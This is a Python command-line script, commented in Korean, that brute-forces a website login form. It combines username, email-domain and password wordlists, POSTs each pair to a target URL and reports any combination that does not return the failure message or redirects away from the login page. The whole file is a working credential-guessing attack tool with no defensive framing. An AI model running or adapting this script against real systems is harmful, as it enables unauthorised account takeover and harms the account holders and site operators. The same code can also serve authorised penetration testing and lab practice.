import argparse
import requests

def brute_force_login(url, user_file=None, domain_file=None, password_file=None, fixed_user=None):
    if fixed_user:
        # 케이스 1: 고정된 사용자 ID와 비밀번호 사전 파일 사용
        with open(password_file, 'r') as pf:
            for password in pf:
                password = password.strip()
                print(f"[*] Trying {fixed_user}:{password}")

                data = {
                    'username': fixed_user,
                    'password': password
                }

                response = requests.post(url, data=data)

                if not "존재하지 않는 이메일 혹은 비밀번호" in response.text:
                    print(f"[+] Success! Username: {fixed_user}, Password: {password}")
                    return True
                else:
                    print(f"[-] Failed with {fixed_user}:{password}")

    elif user_file and domain_file:
        # 케이스 2: 이메일 사용자 ID와 도메인, 비밀번호 사전 파일 사용
        with open(user_file, 'r') as uf:
            for local_part in uf:
                local_part = local_part.strip()

                with open(domain_file, 'r') as df:
                    for domain_part in df:
                        domain_part = domain_part.strip()

                        email = f"{local_part}@{domain_part}"

                        with open(password_file, 'r') as pf:
                            for password in pf:
                                password = password.strip()
                                print(f"[*] Trying {email}:{password}")

                                data = {
                                    'email': email,
                                    'password': password
                                }

                                response = requests.post(url, data=data)
                                print(f"url: {response.url}")
                                print("--절취선---")
                                print(f"headers: {response.headers}")
                                print("--절취선---")
                                print(f"test: {response.text}")


                                # 최종 URL 확인
                                if response.url == url:  # 여전히 로그인 페이지에 머물러 있는 경우
                                    print(f"[-] Failed with {email}:{password}")
                                else:
                                    print(f"[+] Success! Email: {email}, Password: {password}")
                                    return True

    elif user_file and domain_file == None:
        # 케이스 3: 사용자 ID와 비밀번호 모두 사전 파일 사용
        with open(user_file, 'r') as uf:
            for username in uf:
                username = username.strip()

                with open(password_file, 'r') as pf:
                    for password in pf:
                        password = password.strip()
                        print(f"[*] Trying {username}:{password}")

                        data = {
                            'username': username,
                            'password': password
                        }

                        response = requests.post(url, data=data)

                        if not "존재하지 않는 이메일 혹은 비밀번호" in response.text:
                            print(f"[+] Success! Username: {username}, Password: {password}")
                            return True
                        else:
                            print(f"[-] Failed with {username}:{password}")

    print("[-] No valid username/password combination found.")
    return False

def main():
    parser = argparse.ArgumentParser(description="Brute Force Login Script")
    
    # 사용자 옵션 정의
    parser.add_argument('-i', '--id', type=str, help="Single username or file containing usernames")
    parser.add_argument('-d', '--domain', type=str, help="File containing domain parts for email (optional)", default=None)
    parser.add_argument('-p', '--password', type=str, required=True, help="File containing passwords")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
    
    args = parser.parse_args()

    # 파일이나 단일 사용자 ID에 따라 구분
    if args.id and args.id.endswith(".txt"):
        user_file = args.id
        fixed_user = None
    else:
        user_file = None
        fixed_user = args.id

    # 브루트포스 로그인 함수 호출
    brute_force_login(
        url=args.url,
        user_file=user_file,
        domain_file=args.domain,
        password_file=args.password,
        fixed_user=fixed_user
    )

if __name__ == "__main__":
    main()
